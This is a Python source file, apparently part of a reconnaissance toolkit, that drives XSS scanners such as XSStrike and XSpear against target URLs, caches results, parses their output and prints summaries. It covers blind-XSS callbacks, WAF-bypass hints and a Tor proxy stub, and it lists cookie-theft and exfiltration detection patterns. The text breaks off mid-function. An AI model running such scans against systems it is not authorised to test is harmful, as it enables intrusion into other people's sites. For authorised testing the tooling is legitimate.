#!/usr/bin/env python3

import os
import sys
import sqlite3
import shutil
import subprocess
import json
import csv
import urllib.parse
import time
import hashlib
import re
from datetime import datetime, timedelta
from pathlib import Path

import click
import httpx

try:
    from reconcli.db import get_db_manager
    from reconcli.db.models import Vulnerability, VulnType, VulnSeverity, Target

    DB_AVAILABLE = True
except ImportError:
    DB_AVAILABLE = False

HOME = str(Path.home())
RECON_DIR = os.path.join(HOME, ".reconcli")
# Fallback SQLite DB for when main DB is not available
FALLBACK_DB_PATH = os.path.join(RECON_DIR, "xsscli.db")
DEFAULT_PAYLOADS = os.path.join(
    os.path.dirname(__file__), "payloads", "xss-advanced.txt"
)

BINARIES = [
    "dalfox",
    "gf",
    "playwright",
    "curl",
    "jq",
    "qsreplace",
    "kxss",
    "knoxnl",
    "waybackurls",
    "unfurl",
    "linkfinder",
    "paramspider",
    "xsstrike",
    "httpx",
    "gau",
    "hakrawler",
    "gospider",
    "katana",
    "nuclei",
    "subfinder",
    "assetfinder",
    "gxss",
    "bxss",
    "freq",
    "anew",
    "rush",
    "parallel",
    "xargs",
    "chromedriver",
    "geckodriver",
    "playwright-python",
    "XSpear",
    "ruby",
]

# XSS Categories for payload organization
XSS_CATEGORIES = {
    "basic": "Basic XSS payloads",
    "dom": "DOM-based XSS payloads",
    "reflected": "Reflected XSS payloads",
    "stored": "Stored XSS payloads",
    "blind": "Blind XSS payloads",
    "waf_bypass": "WAF bypass payloads",
    "csp_bypass": "CSP bypass payloads",
    "polyglot": "Polyglot XSS payloads",
    "modern": "Modern JavaScript XSS",
    "custom": "Custom user payloads",
}

os.makedirs(RECON_DIR, exist_ok=True)


class XSSCacheManager:
    """Intelligent caching system for XSS vulnerability testing results with performance optimization."""

    def __init__(self, cache_dir: str = "xss_cache", max_age_hours: int = 24):
        self.cache_dir = Path(cache_dir)
        self.cache_dir.mkdir(parents=True, exist_ok=True)
        self.max_age = timedelta(hours=max_age_hours)
        self.cache_index_file = self.cache_dir / "xss_cache_index.json"
        self.cache_index = self._load_cache_index()
        self.hits = 0
        self.misses = 0

    def _load_cache_index(self) -> dict:
        """Load cache index from disk."""
        if self.cache_index_file.exists():
            try:
                with open(self.cache_index_file, "r") as f:
                    return json.load(f)
            except (json.JSONDecodeError, IOError):
                return {}
        return {}

    def _save_cache_index(self):
        """Save cache index to disk."""
        try:
            with open(self.cache_index_file, "w") as f:
                json.dump(self.cache_index, f, indent=2)
        except IOError as e:
            click.echo(f"Warning: Failed to save cache index: {e}", err=True)

    def _generate_cache_key(
        self,
        target: str,
        payloads: list,
        method: str = "GET",
        custom_headers: dict = None,
        **kwargs,
    ) -> str:
        """Generate a unique cache key for XSS test parameters."""
        # Create deterministic key from test parameters
        key_data = {
            "target": target,
            "payloads": sorted(payloads) if payloads else [],
            "method": method.upper(),
            "headers": sorted(custom_headers.items()) if custom_headers else [],
            "kwargs": sorted(kwargs.items()),
        }

        key_string = json.dumps(key_data, sort_keys=True)
        return hashlib.sha256(key_string.encode()).hexdigest()

    def _is_cache_valid(self, timestamp: str) -> bool:
        """Check if cache entry is still valid based on timestamp."""
        try:
            cache_time = datetime.fromisoformat(timestamp)
            return datetime.now() - cache_time < self.max_age
        except (ValueError, TypeError):
            return False

    def get_cached_result(
        self,
        target: str,
        payloads: list,
        method: str = "GET",
        custom_headers: dict = None,
        **kwargs,
    ) -> dict:
        """Retrieve cached XSS test results if available and valid."""
        cache_key = self._generate_cache_key(
            target, payloads, method, custom_headers, **kwargs
        )

        if cache_key in self.cache_index:
            cache_entry = self.cache_index[cache_key]
            if self._is_cache_valid(cache_entry["timestamp"]):
                cache_file = self.cache_dir / f"{cache_key}.json"
                if cache_file.exists():
                    try:
                        with open(cache_file, "r") as f:
                            result = json.load(f)
                        self.hits += 1
                        click.echo(
                            f"✅ Cache HIT for XSS test: {target[:50]}...", err=True
                        )
                        return result
                    except (json.JSONDecodeError, IOError):
                        # Cache file corrupted, remove from index
                        del self.cache_index[cache_key]
                        self._save_cache_index()

        self.misses += 1
        click.echo(f"❌ Cache MISS for XSS test: {target[:50]}...", err=True)
        return None

    def save_result(
        self,
        target: str,
        payloads: list,
        result: dict,
        method: str = "GET",
        custom_headers: dict = None,
        **kwargs,
    ):
        """Save XSS test results to cache."""
        cache_key = self._generate_cache_key(
            target, payloads, method, custom_headers, **kwargs
        )

        # Add metadata to result
        cached_result = {
            "metadata": {
                "target": target,
                "method": method,
                "payloads_count": len(payloads) if payloads else 0,
                "timestamp": datetime.now().isoformat(),
                "cache_key": cache_key,
            },
            "result": result,
        }

        # Save result to file
        cache_file = self.cache_dir / f"{cache_key}.json"
        try:
            with open(cache_file, "w") as f:
                json.dump(cached_result, f, indent=2)

            # Update cache index
            self.cache_index[cache_key] = {
                "target": target,
                "timestamp": datetime.now().isoformat(),
                "file": f"{cache_key}.json",
                "payloads_count": len(payloads) if payloads else 0,
            }
            self._save_cache_index()

        except IOError as e:
            click.echo(f"Warning: Failed to save cache: {e}", err=True)

    def clear_cache(self) -> int:
        """Clear all cached results and return count of removed files."""
        removed_count = 0

        # Remove cache files
        for cache_file in self.cache_dir.glob("*.json"):
            if cache_file.name != "xss_cache_index.json":
                try:
                    cache_file.unlink()
                    removed_count += 1
                except OSError:
                    pass

        # Clear cache index
        self.cache_index.clear()
        self._save_cache_index()

        return removed_count

    def get_cache_stats(self) -> dict:
        """Get cache performance statistics."""
        total_requests = self.hits + self.misses
        hit_rate = (self.hits / total_requests * 100) if total_requests > 0 else 0

        # Count cache files
        cache_files = len(
            [
                f
                for f in self.cache_dir.glob("*.json")
                if f.name != "xss_cache_index.json"
            ]
        )

        # Calculate cache size
        cache_size = sum(f.stat().st_size for f in self.cache_dir.glob("*.json")) / (
            1024 * 1024
        )

        return {
            "total_requests": total_requests,
            "cache_hits": self.hits,
            "cache_misses": self.misses,
            "hit_rate": round(hit_rate, 2),
            "cached_results": cache_files,
            "cache_size_mb": round(cache_size, 2),
            "cache_dir": str(self.cache_dir),
        }

    def cleanup_expired_cache(self) -> int:
        """Remove expired cache entries and return count of removed files."""
        removed_count = 0
        current_time = datetime.now()

        expired_keys = []
        for cache_key, cache_entry in self.cache_index.items():
            if not self._is_cache_valid(cache_entry["timestamp"]):
                expired_keys.append(cache_key)

        # Remove expired entries
        for cache_key in expired_keys:
            cache_file = self.cache_dir / f"{cache_key}.json"
            try:
                if cache_file.exists():
                    cache_file.unlink()
                    removed_count += 1
                del self.cache_index[cache_key]
            except OSError:
                pass

        if removed_count > 0:
            self._save_cache_index()

        return removed_count


def ai_analyze_xss_results(results, query="", target_info=None):
    """AI-powered analysis of XSS test results"""
    if not results:
        return "No XSS results to analyze"

    analysis = []
    analysis.append(f"🤖 AI XSS Analysis for query: '{query}'")
    analysis.append("=" * 60)

    # Overall statistics
    total_tests = len(results)
    vulnerable_count = len([r for r in results if r.get("vulnerable", False)])
    reflected_count = len([r for r in results if r.get("reflected", False)])

    analysis.append(f"📊 Test Results Summary:")
    analysis.append(f"  Total tests performed: {total_tests}")
    analysis.append(f"  Vulnerable findings: {vulnerable_count}")
    analysis.append(f"  Reflected payloads: {reflected_count}")

    if total_tests > 0:
        vuln_rate = (vulnerable_count / total_tests) * 100
        refl_rate = (reflected_count / total_tests) * 100
        analysis.append(f"  Vulnerability rate: {vuln_rate:.1f}%")
        analysis.append(f"  Reflection rate: {refl_rate:.1f}%")

    # Parameter analysis
    params = {}
    methods = {}
    payloads_success = {}
    response_codes = {}

    for result in results:
        # Parameter frequency
        param = result.get("param", "unknown")
        params[param] = params.get(param, 0) + 1

        # Method analysis
        method = result.get("method", "GET")
        methods[method] = methods.get(method, 0) + 1

        # Successful payload analysis
        if result.get("vulnerable", False):
            payload = (
                result.get("payload", "")[:50] + "..."
                if len(result.get("payload", "")) > 50
                else result.get("payload", "")
            )
            payloads_success[payload] = payloads_success.get(payload, 0) + 1

        # Response code analysis
        code = result.get("response_code", "unknown")
        response_codes[str(code)] = response_codes.get(str(code), 0) + 1

    # Top vulnerable parameters
    analysis.append(f"\n🎯 Parameter Analysis:")
    top_params = sorted(params.items(), key=lambda x: x[1], reverse=True)[:5]
    for param, count in top_params:
        percentage = (count / total_tests) * 100
        analysis.append(f"  {param}: {count} tests ({percentage:.1f}%)")

    # HTTP Methods
    analysis.append(f"\n📡 HTTP Methods Used:")
    for method, count in sorted(methods.items(), key=lambda x: x[1], reverse=True):
        percentage = (count / total_tests) * 100
        analysis.append(f"  {method}: {count} ({percentage:.1f}%)")

    # Most successful payloads
    if payloads_success:
        analysis.append(f"\n💥 Most Successful Payloads:")
        top_payloads = sorted(
            payloads_success.items(), key=lambda x: x[1], reverse=True
        )[:5]
        for payload, count in top_payloads:
            analysis.append(f"  {count}x: {payload}")

    # Response code analysis
    analysis.append(f"\n📈 Response Code Distribution:")
    top_codes = sorted(response_codes.items(), key=lambda x: x[1], reverse=True)[:5]
    for code, count in top_codes:
        percentage = (count / total_tests) * 100
        analysis.append(f"  HTTP {code}: {count} ({percentage:.1f}%)")

    # Security insights
    analysis.append(f"\n🔒 Security Insights:")

    # Check for dangerous patterns
    dangerous_patterns = {
        "script_execution": ["<script>", "javascript:", "onerror=", "onload="],
        "dom_manipulation": ["document.", "window.", "eval(", "innerHTML"],
        "data_exfiltration": [
            "fetch(",
            "XMLHttpRequest",
            "location.href",
            "document.cookie",
        ],
        "event_handlers": ["onclick=", "onmouseover=", "onfocus=", "ontoggle="],
        "iframe_injection": ["<iframe", "<object", "<embed", "data:"],
    }

    pattern_matches = {}
    for result in results:
        if result.get("vulnerable", False):
            payload = result.get("payload", "").lower()
            for category, patterns in dangerous_patterns.items():
                for pattern in patterns:
                    if pattern in payload:
                        pattern_matches[category] = pattern_matches.get(category, 0) + 1
                        break

    if pattern_matches:
        analysis.append(f"  ⚠️  Dangerous XSS patterns detected:")
        for category, count in sorted(
            pattern_matches.items(), key=lambda x: x[1], reverse=True
        ):
            analysis.append(
                f"    {category.replace('_', ' ').title()}: {count} instances"
            )
    else:
        analysis.append(
            f"  ✅ No immediately dangerous patterns in successful payloads"
        )

    # WAF/Filter analysis
    blocked_indicators = [
        "403",
        "406",
        "429",
        "503",
        "blocked",
        "forbidden",
        "filtered",
    ]
    blocked_count = 0
    for result in results:
        response_code = str(result.get("response_code", ""))
        if any(indicator in response_code.lower() for indicator in blocked_indicators):
            blocked_count += 1

    if blocked_count > 0:
        block_rate = (blocked_count / total_tests) * 100
        analysis.append(
            f"  🛡️  Potential WAF/filtering detected: {blocked_count} blocked ({block_rate:.1f}%)"
        )

    # Recommendations
    analysis.append(f"\n💡 Recommendations:")

    if vulnerable_count > 0:
        analysis.append(f"  🚨 CRITICAL: {vulnerable_count} XSS vulnerabilities found!")
        analysis.append(f"  - Implement proper input validation and output encoding")
        analysis.append(f"  - Use Content Security Policy (CSP) headers")
        analysis.append(f"  - Consider implementing XSS protection headers")

        if "document.cookie" in str(results):
            analysis.append(
                f"  - Implement HttpOnly cookie flags to prevent cookie theft"
            )

        if any("script_execution" in str(r) for r in results):
            analysis.append(f"  - Review all user input points for script injection")
    else:
        analysis.append(f"  ✅ No XSS vulnerabilities detected in this scan")
        analysis.append(f"  - Continue regular security testing")
        analysis.append(f"  - Consider testing with more advanced payloads")

    if reflected_count > vulnerable_count:
        analysis.append(f"  ⚠️  Some payloads reflected but not confirmed vulnerable")
        analysis.append(f"  - Manual verification recommended for reflected payloads")

    # Advanced recommendations based on patterns
    if "dom_manipulation" in pattern_matches:
        analysis.append(f"  - Review client-side JavaScript for DOM-based XSS")

    if blocked_count > total_tests * 0.3:  # More than 30% blocked
        analysis.append(f"  - WAF detected - consider advanced bypass techniques")
        analysis.append(f"  - Test with encoded and obfuscated payloads")

    # Target-specific insights
    if target_info:
        analysis.append(f"\n🎯 Target-Specific Insights:")
        if "waf" in target_info:
            analysis.append(f"  - WAF detected: {target_info['waf']}")
        if "technologies" in target_info:
            analysis.append(
                f"  - Technologies: {', '.join(target_info['technologies'])}"
            )

    return "\n".join(analysis)


def run_xsstrike_scan(
    target,
    output_file=None,
    threads=10,
    delay=1,
    crawl=False,
    blind_url=None,
    custom_headers=None,
    fuzzer=False,
    skip_dom=False,
    params=None,
):
    """Run XSStrike XSS scanner on target URL."""

    if not check_binary("python3"):
        print("[!] Python3 not found. XSStrike requires Python3.")
        return None

    # Check for XSStrike directory or script
    xsstrike_paths = [
        "XSStrike/xsstrike.py",
        "./XSStrike/xsstrike.py",
        "/opt/XSStrike/xsstrike.py",
        "/usr/local/bin/xsstrike.py",
        "xsstrike.py",
    ]

    xsstrike_path = None
    for path in xsstrike_paths:
        if os.path.exists(path):
            xsstrike_path = path
            break

    if not xsstrike_path:
        print("[!] XSStrike not found. Install with:")
        print("    git clone https://github.com/s0md3v/XSStrike")
        print("    cd XSStrike")
        print("    pip install -r requirements.txt --break-system-packages")
        return None

    print(f"[*] Running XSStrike scan on {target}")
    print(f"[*] Using XSStrike at: {xsstrike_path}")

    # Build XSStrike command
    cmd = ["python3", xsstrike_path, "-u", target]

    # Add threading option
    if threads and threads > 1:
        cmd.extend(["--threads", str(threads)])

    # Add delay option
    if delay and delay > 0:
        cmd.extend(["--delay", str(delay)])

    # Enable crawling for comprehensive scanning
    if crawl:
        cmd.append("--crawl")
        print(f"[*] Crawling enabled for comprehensive scanning")

    # Blind XSS support
    if blind_url:
        cmd.extend(["--blind", blind_url])
        print(f"[*] Blind XSS callback URL: {blind_url}")

    # Custom headers support
    if custom_headers:
        # XSStrike uses --headers for custom headers
        headers_str = ""
        for key, value in custom_headers.items():
            headers_str += f"{key}: {value}\\n"
        cmd.extend(["--headers", headers_str])
        print(f"[*] Using custom headers")

    # Enable fuzzing engine
    if fuzzer:
        cmd.append("--fuzzer")
        print(f"[*] Fuzzing engine enabled")

    # Skip DOM XSS scanning if requested
    if skip_dom:
        cmd.append("--skip-dom")
        print(f"[*] Skipping DOM XSS scanning")

    # Specific parameters to test
    if params:
        if isinstance(params, list):
            for param in params:
                cmd.extend(["--params", param])
        else:
            cmd.extend(["--params", params])
        print(f"[*] Testing specific parameters: {params}")

    # Output options for structured results
    if output_file:
        # XSStrike doesn't have direct JSON output, we'll capture stdout
        cmd.extend(["--file-log-level", "INFO"])

    # Additional XSStrike options for advanced scanning
    cmd.extend(
        [
            "--timeout",
            "10",  # 10 second timeout per request
            "--skip-poc",  # Skip proof of concept generation for speed
            "--encode",
            "1",  # Enable basic payload encoding
        ]
    )

    try:
        print(f"[*] Executing: {' '.join(cmd)}")
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=600  # 10 minute timeout
        )

        if result.returncode == 0:
            print(f"[+] XSStrike scan completed successfully")
            return {
                "success": True,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "command": " ".join(cmd),
                "target": target,
            }
        else:
            print(f"[!] XSStrike scan completed with warnings/errors")
            # XSStrike may return non-zero but still have useful output
            return {
                "success": True,  # Still consider it successful if we got output
                "stdout": result.stdout,
                "stderr": result.stderr,
                "command": " ".join(cmd),
                "target": target,
                "return_code": result.returncode,
            }

    except subprocess.TimeoutExpired:
        print(f"[!] XSStrike scan timed out after 10 minutes")
        return {"success": False, "error": "timeout", "target": target}
    except Exception as e:
        print(f"[!] Error running XSStrike: {e}")
        return {"success": False, "error": str(e), "target": target}


def parse_xsstrike_results(xsstrike_output):
    """Parse XSStrike scan results into structured format."""

    if not xsstrike_output or not xsstrike_output.get("success"):
        return []

    results = []
    output_lines = xsstrike_output.get("stdout", "").split("\n")

    current_vuln = {}

    # XSStrike output patterns to parse
    vuln_indicators = [
        "XSS Detected",
        "Payload:",
        "Vulnerable Parameter:",
        "Context:",
        "Reflected",
        "DOM XSS",
        "Blind XSS",
    ]

    for line in output_lines:
        line = line.strip()

        if not line:
            continue

        # Remove ANSI color codes for clean parsing
        line = re.sub(r"\x1b\[[0-9;]*m", "", line)

        # Detect vulnerability findings
        if any(
            indicator in line
            for indicator in ["XSS Detected", "Vulnerable Parameter found"]
        ):
            if current_vuln:
                results.append(current_vuln)
            current_vuln = {
                "vulnerable": True,
                "tool": "xsstrike",
                "timestamp": datetime.now().isoformat(),
                "target": xsstrike_output.get("target", ""),
            }

        # Parse URL information
        elif line.startswith("URL:") and current_vuln:
            current_vuln["url"] = line.split("URL:")[1].strip()

        # Parse parameter information
        elif "Parameter:" in line and current_vuln:
            param_match = re.search(r"Parameter:\s*([^\s]+)", line)
            if param_match:
                current_vuln["param"] = param_match.group(1)

        # Parse payload information
        elif "Payload:" in line and current_vuln:
            payload_start = line.find("Payload:") + 8
            current_vuln["payload"] = line[payload_start:].strip()

        # Parse method information
        elif "Method:" in line and current_vuln:
            method_match = re.search(r"Method:\s*([A-Z]+)", line)
            if method_match:
                current_vuln["method"] = method_match.group(1)

        # Parse context information (XSStrike specialty)
        elif "Context:" in line and current_vuln:
            context_start = line.find("Context:") + 8
            current_vuln["context"] = line[context_start:].strip()

        # Parse XSS type information
        elif "DOM XSS" in line and current_vuln:
            current_vuln["xss_type"] = "dom"
            current_vuln["dom_xss"] = True

        elif "Reflected" in line and current_vuln:
            current_vuln["reflected"] = True
            if "xss_type" not in current_vuln:
                current_vuln["xss_type"] = "reflected"

        elif "Stored" in line and current_vuln:
            current_vuln["xss_type"] = "stored"

        elif "Blind XSS" in line and current_vuln:
            current_vuln["blind_xss"] = True
            current_vuln["xss_type"] = "blind"

        # Parse WAF detection
        elif "WAF detected" in line or "Protection detected" in line:
            if current_vuln:
                current_vuln["waf_detected"] = True
            # Could also be general info about the target

        # Parse confidence level (XSStrike provides confidence ratings)
        elif "Confidence:" in line and current_vuln:
            confidence_match = re.search(r"Confidence:\s*(\d+)%", line)
            if confidence_match:
                current_vuln["confidence"] = int(confidence_match.group(1))

        # Parse severity if mentioned
        elif any(sev in line.lower() for sev in ["high", "medium", "low", "critical"]):
            severity_match = re.search(r"(critical|high|medium|low)", line.lower())
            if severity_match and current_vuln:
                current_vuln["severity"] = severity_match.group(1)

        # Parse efficiency information
        elif "Efficiency:" in line and current_vuln:
            efficiency_match = re.search(r"Efficiency:\s*(\d+)%", line)
            if efficiency_match:
                current_vuln["efficiency"] = int(efficiency_match.group(1))

    # Add last vulnerability if exists
    if current_vuln:
        results.append(current_vuln)

    # Enhanced parsing for different XSStrike output formats
    # Look for additional patterns in case the main parsing missed something
    if not results:
        # Try alternative parsing for different XSStrike versions
        xss_lines = [
            line
            for line in output_lines
            if any(
                keyword in line.lower() for keyword in ["xss", "payload", "vulnerable"]
            )
        ]

        if xss_lines:
            # Basic result extraction for unstructured output
            basic_result = {
                "vulnerable": True,
                "tool": "xsstrike",
                "timestamp": datetime.now().isoformat(),
                "target": xsstrike_output.get("target", ""),
                "raw_output": "\n".join(xss_lines),
                "note": "Basic parsing - manual review recommended",
                "confidence": 50,  # Lower confidence for basic parsing
            }

            # Try to extract URL from first line
            for line in xss_lines:
                url_match = re.search(r"https?://[^\s]+", line)
                if url_match:
                    basic_result["url"] = url_match.group(0)
                    break

            results.append(basic_result)

    # Post-processing: add derived information
    for result in results:
        # Set default values
        if "confidence" not in result:
            result["confidence"] = 80  # Default high confidence for XSStrike

        if "severity" not in result:
            # Determine severity based on XSS type and context
            if result.get("dom_xss"):
                result["severity"] = "high"
            elif result.get("blind_xss"):
                result["severity"] = "medium"
            else:
                result["severity"] = "medium"

        # Add XSStrike specific metadata
        result["engine_features"] = {
            "context_analysis": True,
            "intelligent_payloads": True,
            "waf_detection": result.get("waf_detected", False),
            "dom_scanning": result.get("dom_xss", False),
        }

    print(f"[*] Parsed {len(results)} XSStrike results")
    return results


def run_xsstrike_with_cache(target, cache_manager=None, **kwargs):
    """Run XSStrike with intelligent caching support."""

    if not cache_manager:
        # Run without cache
        return run_xsstrike_scan(target, **kwargs)

    # Generate cache key for XSStrike scan
    cache_key_data = {
        "target": target,
        "tool": "xsstrike",
        "kwargs": sorted(kwargs.items()),
    }

    cache_key = hashlib.sha256(
        json.dumps(cache_key_data, sort_keys=True).encode()
    ).hexdigest()

    # Check cache first
    cached_result = cache_manager.get_cached_result(
        target, ["xsstrike"], method="XSStrike", tool="xsstrike"
    )

    if cached_result:
        print(f"[+] Using cached XSStrike results for {target}")
        return cached_result.get("result", {})

    # Run actual scan
    print(f"[*] Running fresh XSStrike scan for {target}")
    result = run_xsstrike_scan(target, **kwargs)

    # Cache the result
    if result and cache_manager:
        cache_manager.save_result(
            target, ["xsstrike"], result, method="XSStrike", tool="xsstrike"
        )
        print(f"[+] Cached XSStrike results for {target}")

    return result


def xsstrike_ai_analysis(xsstrike_results, target_info=None):
    """AI-powered analysis specifically for XSStrike results."""

    if not xsstrike_results:
        return "No XSStrike results to analyze"

    analysis = []
    analysis.append("🎯 XSStrike AI Analysis")
    analysis.append("=" * 50)

    # XSStrike-specific metrics
    total_vulns = len(xsstrike_results)
    dom_xss = len([r for r in xsstrike_results if r.get("dom_xss", False)])
    reflected_xss = len([r for r in xsstrike_results if r.get("reflected", False)])
    blind_xss = len([r for r in xsstrike_results if r.get("blind_xss", False)])
    waf_detected = len([r for r in xsstrike_results if r.get("waf_detected", False)])

    # Calculate average confidence
    confidences = [
        r.get("confidence", 0) for r in xsstrike_results if r.get("confidence")
    ]
    avg_confidence = sum(confidences) / len(confidences) if confidences else 0

    analysis.append(f"📊 XSStrike Advanced Scan Summary:")
    analysis.append(f"  Total vulnerabilities: {total_vulns}")
    analysis.append(f"  DOM XSS findings: {dom_xss}")
    analysis.append(f"  Reflected XSS: {reflected_xss}")
    analysis.append(f"  Blind XSS: {blind_xss}")
    analysis.append(f"  WAF detection instances: {waf_detected}")
    analysis.append(f"  Average confidence: {avg_confidence:.1f}%")

    # XSStrike unique capabilities analysis
    analysis.append(f"\n🧠 XSStrike Intelligence Features:")

    # Context analysis detection
    contexts = [r.get("context", "") for r in xsstrike_results if r.get("context")]
    if contexts:
        analysis.append(
            f"  ✅ Context analysis active ({len(contexts)} contexts identified)"
        )
        unique_contexts = set(contexts)
        analysis.append(f"  🔍 Unique contexts discovered: {len(unique_contexts)}")

        # Show top contexts
        if len(unique_contexts) > 0:
            analysis.append(
                f"  📋 Context types: {', '.join(list(unique_contexts)[:3])}"
            )

    # Payload intelligence
    payloads = [r.get("payload", "") for r in xsstrike_results if r.get("payload")]
    if payloads:
        # Analyze payload sophistication
        advanced_patterns = [
            "confirm",
            "prompt",
            "eval",
            "onerror",
            "onload",
            "dom",
            "bypass",
        ]
        advanced_payloads = sum(
            1
            for p in payloads
            if any(pattern in p.lower() for pattern in advanced_patterns)
        )

        analysis.append(f"  🚀 Intelligent payloads generated: {len(payloads)}")
        analysis.append(
            f"  🎯 Advanced payloads: {advanced_payloads} ({(advanced_payloads/len(payloads)*100):.1f}%)"
        )

    # WAF evasion capabilities
    if waf_detected > 0:
        analysis.append(f"  🛡️ WAF evasion techniques employed")
        analysis.append(f"  🔓 WAF bypass attempts: {waf_detected} instances")

    # DOM XSS analysis (XSStrike specialty)
    if dom_xss > 0:
        analysis.append(f"  🌐 DOM XSS scanner active")
        analysis.append(f"  ⚡ Client-side vulnerabilities: {dom_xss} found")
        analysis.append(f"  🔄 JavaScript context analysis performed")

    # Efficiency analysis
    efficiencies = [
        r.get("efficiency", 0) for r in xsstrike_results if r.get("efficiency")
    ]
    if efficiencies:
        avg_efficiency = sum(efficiencies) / len(efficiencies)
        analysis.append(f"  📈 Average payload efficiency: {avg_efficiency:.1f}%")

    # Payload categories analysis
    payload_types = {}
    for result in xsstrike_results:
        payload = result.get("payload", "").lower()
        if "script" in payload:
            payload_types["script_injection"] = (
                payload_types.get("script_injection", 0) + 1
            )
        if "onerror" in payload or "onload" in payload:
            payload_types["event_handler"] = payload_types.get("event_handler", 0) + 1
        if "javascript:" in payload:
            payload_types["javascript_protocol"] = (
                payload_types.get("javascript_protocol", 0) + 1
            )
        if any(enc in payload for enc in ["%", "&#", "\\u"]):
            payload_types["encoded"] = payload_types.get("encoded", 0) + 1

    if payload_types:
        analysis.append(f"\n💥 XSStrike Payload Distribution:")
        for ptype, count in sorted(
            payload_types.items(), key=lambda x: x[1], reverse=True
        ):
            percentage = (count / total_vulns) * 100
            analysis.append(
                f"  {ptype.replace('_', ' ').title()}: {count} ({percentage:.1f}%)"
            )

    # XSStrike-specific recommendations
    analysis.append(f"\n💡 XSStrike Expert Recommendations:")

    if total_vulns > 0:
        analysis.append(f"  🚨 XSStrike identified {total_vulns} XSS vulnerabilities")
        analysis.append(f"  🔬 Advanced context analysis validates findings")

        if dom_xss > 0:
            analysis.append(f"  ⚠️ DOM XSS critical - implement CSP policies")
            analysis.append(f"  🌐 Review client-side JavaScript frameworks")

        if blind_xss > 0:
            analysis.append(f"  👁️ Blind XSS detected - implement output encoding")
            analysis.append(f"  📡 Monitor callback URLs for exploitation attempts")

        if waf_detected > 0:
            analysis.append(f"  🛡️ WAF detected but bypassed - strengthen WAF rules")
            analysis.append(f"  🔧 Implement additional security layers")

        if avg_confidence > 90:
            analysis.append(
                f"  🎯 High confidence findings - immediate remediation needed"
            )
        elif avg_confidence > 70:
            analysis.append(f"  ⚠️ Medium confidence - manual verification recommended")

    else:
        analysis.append(f"  ✅ XSStrike found no XSS vulnerabilities")
        analysis.append(f"  🔍 Advanced scanning techniques found no bypasses")
        analysis.append(
            f"  🧠 Context analysis and intelligent payloads detected no issues"
        )

    # Target-specific insights
    if target_info:
        analysis.append(f"\n🎯 Target-Specific Analysis:")
        if target_info.get("crawl_enabled"):
            analysis.append(f"  🕷️ Comprehensive crawling performed")
        if target_info.get("fuzzer_enabled"):
            analysis.append(f"  🔀 Fuzzing engine activated")
        if target_info.get("custom_headers"):
            analysis.append(f"  📋 Custom headers configuration applied")

    return "\n".join(analysis)


def setup_tor_proxy(tor_proxy_url):
    """Setup httpx client with Tor proxy"""
    try:
        import httpx

        print(f"[*] Setting up Tor proxy: {tor_proxy_url}")

        # Create client with proxy configuration
        client = httpx.Client(
            timeout=15,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
            },
        )

        # For now, return basic client as httpx proxy support might need specific setup
        # In production, you might want to use different approach
        print(
            f"[*] Tor proxy setup initiated (Note: Full proxy support may require additional configuration)"
        )

        # Test basic connectivity first
        try:
            response = client.get("https://httpbin.org/ip", timeout=10)
            if response.status_code == 200:
                print(f"[+] Basic connectivity test passed")
                return client
            else:
                print(f"[!] Connectivity test failed")
        except Exception as e:
            print(f"[!] Connectivity test error: {e}")

        return client

    except Exception as e:
        print(f"[!] Error setting up Tor proxy: {e}")
        print(f"[*] Make sure Tor is running and accessible at {tor_proxy_url}")
        return None


def run_xspear_scan(
    target, output_file=None, blind_url=None, custom_payloads=None, threads=10, delay=1
):
    """Run XSpear XSS scanner on target URL."""

    if not check_binary("XSpear"):
        print("[!] XSpear not found. Install with: gem install XSpear")
        return None

    if not check_binary("ruby"):
        print("[!] Ruby not found. Install Ruby first.")
        return None

    print(f"[*] Running XSpear scan on {target}")

    # Build XSpear command
    cmd = ["XSpear", "-u", target]

    # Add options
    if threads:
        cmd.extend(["-t", str(threads)])

    # XSpear doesn't have --delay option, skip it
    # if delay:
    #     cmd.extend(["--delay", str(delay)])

    if blind_url:
        cmd.extend(["-b", blind_url])
        print(f"[*] Using blind XSS callback: {blind_url}")

    if custom_payloads and os.path.exists(custom_payloads):
        cmd.extend(["--custom-payload", custom_payloads])
        print(f"[*] Using custom payloads: {custom_payloads}")

    # Output options
    if output_file:
        cmd.extend(["-o", "json"])  # Use json output for better parsing

    # Additional XSpear options for advanced scanning
    cmd.extend(
        [
            "-v",
            "2",  # Verbose mode 2 (show scanning logs)
            "-a",  # Test all parameters
        ]
    )

    try:
        print(f"[*] Executing: {' '.join(cmd)}")
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=300  # 5 minute timeout
        )

        if result.returncode == 0:
            print(f"[+] XSpear scan completed successfully")
            return {
                "success": True,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "command": " ".join(cmd),
            }
        else:
            print(f"[!] XSpear scan failed with return code: {result.returncode}")
            print(f"[!] Error output: {result.stderr}")
            return {
                "success": False,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "command": " ".join(cmd),
                "return_code": result.returncode,
            }

    except subprocess.TimeoutExpired:
        print(f"[!] XSpear scan timed out after 5 minutes")
        return {"success": False, "error": "timeout"}
    except Exception as e:
        print(f"[!] Error running XSpear: {e}")
        return {"success": False, "error": str(e)}


def parse_xspear_results(xspear_output):
    """Parse XSpear scan results into structured format."""

    if not xspear_output or not xspear_output.get("success"):
        return []

    results = []
    output_lines = xspear_output.get("stdout", "").split("\n")

    current_vuln = {}

    for line in output_lines:
        line = line.strip()

        if not line:
            continue

        # Parse XSpear output patterns
        if "XSS Detected" in line or "VULNERABILITY" in line.upper():
            if current_vuln:
                results.append(current_vuln)
            current_vuln = {
                "vulnerable": True,
                "tool": "xspear",
                "timestamp": datetime.now().isoformat(),
            }

        elif "URL:" in line and current_vuln:
            current_vuln["url"] = line.split("URL:")[1].strip()

        elif "Parameter:" in line and current_vuln:
            current_vuln["param"] = line.split("Parameter:")[1].strip()

        elif "Payload:" in line and current_vuln:
            current_vuln["payload"] = line.split("Payload:")[1].strip()

        elif "Method:" in line and current_vuln:
            current_vuln["method"] = line.split("Method:")[1].strip()

        elif "Response Code:" in line and current_vuln:
            try:
                current_vuln["response_code"] = int(
                    line.split("Response Code:")[1].strip()
                )
            except ValueError:
                current_vuln["response_code"] = 0

        elif "WAF Detected:" in line and current_vuln:
            current_vuln["waf_detected"] = "true" in line.lower()

        elif "Blind XSS" in line and current_vuln:
            current_vuln["blind_xss"] = True

        elif "Reflected" in line and current_vuln:
